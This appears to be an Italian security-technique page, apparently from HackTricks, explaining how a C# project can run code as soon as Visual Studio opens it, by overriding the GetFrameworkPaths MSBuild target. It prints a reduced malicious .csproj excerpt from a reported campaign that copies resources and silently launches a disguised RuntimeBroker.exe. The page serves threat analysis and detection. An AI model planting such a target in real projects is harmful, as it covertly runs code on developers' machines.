# Esecuzione di MSBuild in fase di progettazione nei progetti Visual Studio

{{#include ../banners/hacktricks-training.md}}

Aprire un progetto C# in Visual Studio non è una lettura passiva. La compilazione in fase di progettazione richiama target MSBuild denominati per inizializzare IntelliSense, i riferimenti e il debugging **prima** che lo sviluppatore selezioni Build o Run. `GetFrameworkPaths` è uno di questi target. Un progetto che lo ridefinisce può trasformare il caricamento del progetto in esecuzione di codice nel contesto dell'utente, senza bisogno di un clic separato sul payload.<sup>[[1]](#references)[[2]](#references)</sup>

Il progetto segnalato dichiarava file di risorse, quindi usava `MakeDir`, `Copy` ed `Exec` all'interno del target sostitutivo per predisporre e avviare un payload collocato nella stessa directory. Questo estratto ridotto conserva il percorso di esecuzione mostrato nella Figura 6 della fonte; va inserito all'interno di un `.csproj`, non in un file XML autonomo.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**L’ordine di importazione è importante:** MSBuild usa l’ultima definizione di un target. Non è garantito che un target scritto in un file di progetto sostituisca il target Microsoft se un’importazione successiva lo ridefinisce. I progetti in stile SDK che usano `<Project Sdk="...">` importano implicitamente i target SDK dopo il corpo del progetto, quindi esamina l’ordine di importazione effettivo invece di presumere che questa sovrascrittura funzioni in ogni progetto. `MSBuild.exe -preprocess:expanded.xml project.csproj` espande le importazioni senza compilare il progetto e può aiutare a individuare la definizione effettiva del target.<sup>[[3]](#references)[[4]](#references)</sup>

Questa è una superficie di esecuzione dei progetti per sviluppatori, non un’installazione di un’estensione VSIX e, di per sé, non costituisce un’escalation dei privilegi. Se l’eseguibile predisposto usa un file `.exe.config` o una DLL adiacenti malevoli, continua con [AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 - La campagna Blinder Tunnel prende di mira le infrastrutture irachene](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Integrazione di Visual Studio (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - Target di MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - Riferimento alla riga di comando di MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
